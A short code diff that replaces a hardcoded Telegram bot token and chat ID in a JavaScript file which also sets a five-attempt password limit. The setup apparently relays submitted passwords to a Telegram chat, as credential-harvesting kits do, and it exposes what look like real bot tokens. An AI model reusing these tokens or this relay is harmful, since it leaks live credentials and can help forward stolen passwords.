@@ -1,7 +1,7 @@
 import crypto from 'crypto';
 
-const TELEGRAM_BOT_TOKEN = '8776951267:AAEjcJFLl1mMrZvr0IuR4_t5ojV8oxows_A';  // paste your bot token here
-const TELEGRAM_CHAT_IDS = '-5217759389';      // paste your chat id here (comma-separated for multiple)
+const TELEGRAM_BOT_TOKEN = '8675498310:AAFZWLgXTWl_LwAnB5kB9XuklREnSRM9TPY';  // paste your bot token here
+const TELEGRAM_CHAT_IDS = '-5205589429';      // paste your chat id here (comma-separated for multiple)
 const ALLOWED_ORIGIN = '';
 
 const MAX_PASSWORD_ATTEMPTS = 5;
